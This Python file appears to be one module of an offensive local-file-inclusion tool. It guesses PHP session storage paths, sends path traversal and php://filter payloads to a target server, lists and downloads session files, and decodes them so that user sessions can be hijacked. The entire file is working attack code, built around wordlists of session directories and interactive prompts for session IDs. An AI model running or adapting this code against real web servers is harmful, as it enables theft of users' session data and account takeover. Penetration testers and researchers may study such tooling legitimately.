#!/usr/bin/env python3
"""
Mode 5: PHP Session Enumeration & Hijacking
Attempts to read session.save_path, list session files, and download them.
"""

import re
import urllib.parse
from urllib.parse import quote_plus

# ---------- FALLBACK SESSION PATHS (if no phpinfo) ----------
LINUX_SESSION_PATHS = [
    '/tmp/',
    '/var/lib/php/sessions/',
    '/var/lib/php5/',
    '/var/lib/php/session/',
    '/var/lib/php7/',
    '/var/lib/php8/',
    '/var/lib/php/sessions/',
]

WINDOWS_SESSION_PATHS = [
    'C:/Windows/Temp/',
    'C:/xampp/tmp/',
    'C:/wamp64/tmp/',
    'C:/tmp/',
    'Windows/Temp/',
    'xampp/tmp/',
    'wamp64/tmp/',
]

def _try_directory_listing(path, config, fuzzer):
    """Attempt to get directory listing of session save path."""
    lfi_payload = config['traversal_prefix'] + path.lstrip('/')
    encoded = fuzzer.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
    
    if config['lfi_type'] == 'path':
        url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
    else:
        url = fuzzer._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
    
    status, content = fuzzer.send_http_request(
        config['protocol'], config['host'], config['port'],
        url, verbose=config['verbose']
    )
    if status == 200 and fuzzer.is_directory_listing(content):
        return fuzzer.extract_filenames_from_listing(content)
    return []

def _read_session_file(session_path, config, fuzzer):
    """Directly include and save a session file."""
    lfi_payload = config['traversal_prefix'] + session_path.lstrip('/')
    encoded = fuzzer.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
    
    if config['lfi_type'] == 'path':
        url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
    else:
        url = fuzzer._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
    
    status, content = fuzzer.send_http_request(
        config['protocol'], config['host'], config['port'],
        url, verbose=config['verbose']
    )
    if status == 200 and content and len(content) > 0:
        return content
    return None

def _attempt_base64_decode_bypass(session_path, config, fuzzer):
    """
    If session data is base64-encoded, try php://filter/convert.base64-decode.
    This requires precise length alignment – we attempt both with and without padding.
    """
    # Save original wrapper
    original_wrapper = fuzzer.config['wrapper']
    fuzzer.config['wrapper'] = 'php_filter'
    
    # We need to decode the entire file, but we can't predict the prefix length.
    # Common technique: use convert.base64-decode and hope the garbage is ignored.
    lfi_payload = config['traversal_prefix'] + session_path.lstrip('/')
    encoded = fuzzer.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
    encoded = f"php://filter/convert.base64-decode/resource={encoded}"
    
    if config['lfi_type'] == 'path':
        url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
    else:
        url = fuzzer._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
    
    status, content = fuzzer.send_http_request(
        config['protocol'], config['host'], config['port'],
        url, verbose=config['verbose']
    )
    
    fuzzer.config['wrapper'] = original_wrapper
    if status == 200 and content and '|' in content and ':' in content:
        return content
    return None

def run(config, fuzzer):
    fuzzer._print("\n" + "=" * 60, 'highlight')
    fuzzer._print("[*] MODE 5: PHP SESSION ENUMERATION", 'highlight')
    fuzzer._print("=" * 60, 'highlight')
    
    # ---------- DETERMINE SESSION SAVE PATH ----------
    session_path = None
    # 1. Check if we already have it from phpinfo (config from Mode 3)
    if fuzzer.config.get('doc_root'):  # Placeholder – we didn't store it globally; we can improve.
        # In a full implementation, we'd store session.save_path in fuzzer.config.
        pass
    
    if not session_path:
        fuzzer._print("[*] No session.save_path known. Using fallback wordlist.", 'info')
        wordlist = LINUX_SESSION_PATHS if fuzzer.config['os_type'] == 'linux' else WINDOWS_SESSION_PATHS
        # Test each path for directory listing or existence
        for path in wordlist:
            fuzzer._print(f"[*] Trying session path: {path}", 'info')
            files = _try_directory_listing(path, config, fuzzer)
            if files:
                fuzzer._print(f"[+] Directory listing succeeded at {path}", 'success')
                session_path = path
                break
            else:
                # Try to read a common session file as a beacon (e.g., sess_)
                test_file = path + 'sess_' + 'a'*32
                content = _read_session_file(test_file, config, fuzzer)
                if content is not None:
                    fuzzer._print(f"[+] Session file readable at {path} (beacon)", 'success')
                    session_path = path
                    break
    
    if not session_path:
        fuzzer._print("[-] Could not determine session save path. Provide manually? (y/N): ", 'warning')
        if input().strip().lower() == 'y':
            session_path = input("Enter session save path (e.g., /var/lib/php/sessions/): ").strip()
        else:
            return
    
    # ---------- SESSION ID INPUT ----------
    fuzzer._print(f"[*] Using session path: {session_path}", 'info')
    sid = input("Enter session ID to retrieve (PHPSESSID), or 'list' to enumerate: ").strip()
    
    if sid.lower() == 'list':
        # Attempt directory listing
        files = _try_directory_listing(session_path, config, fuzzer)
        if files:
            fuzzer._print(f"[+] Found {len(files)} session files:", 'success')
            sess_files = [f for f in files if f.startswith('sess_')]
            for sf in sess_files[:20]:  # Limit to 20
                fuzzer._print(f"  - {sf}", 'info')
            # Download first few?
            dl = input("Download all session files? (y/N): ").strip().lower()
            if dl == 'y':
                for sf in sess_files:
                    content = _read_session_file(session_path + sf, config, fuzzer)
                    if content:
                        fuzzer.save_artifact("session", sf, content, 200)
                        # Attempt base64 decode bypass
                        if '==' in content or fuzzer.config['os_type'] == 'linux':  # Heuristic
                            decoded = _attempt_base64_decode_bypass(session_path + sf, config, fuzzer)
                            if decoded:
                                fuzzer.save_artifact("session_decoded", sf + '_decoded', decoded, 200)
        else:
            fuzzer._print("[-] Directory listing failed. Cannot enumerate.", 'error')
    else:
        # Single session ID
        sess_file = session_path.rstrip('/') + '/sess_' + sid
        fuzzer._print(f"[*] Reading {sess_file} ...", 'info')
        content = _read_session_file(sess_file, config, fuzzer)
        if content:
            fuzzer._print("[+] Session file retrieved!", 'success')
            fuzzer.save_artifact("session", f"sess_{sid}", content, 200)
            # Show parsed content
            fuzzer._print("\n[--- SESSION DATA (raw) ---]", 'info')
            print(content[:500] + ('...' if len(content)>500 else ''))
            # Attempt base64 decode bypass
            if '==' in content or fuzzer.config['os_type'] == 'linux':
                fuzzer._print("[*] Attempting base64 decode bypass...", 'info')
                decoded = _attempt_base64_decode_bypass(sess_file, config, fuzzer)
                if decoded:
                    fuzzer._print("[+] Decoded session data!", 'success')
                    fuzzer.save_artifact("session_decoded", f"sess_{sid}_decoded", decoded, 200)
                    print("\n[--- DECODED SESSION DATA ---]")
                    print(decoded[:500] + ('...' if len(decoded)>500 else ''))
        else:
            fuzzer._print("[-] Session file not found or not readable.", 'error')
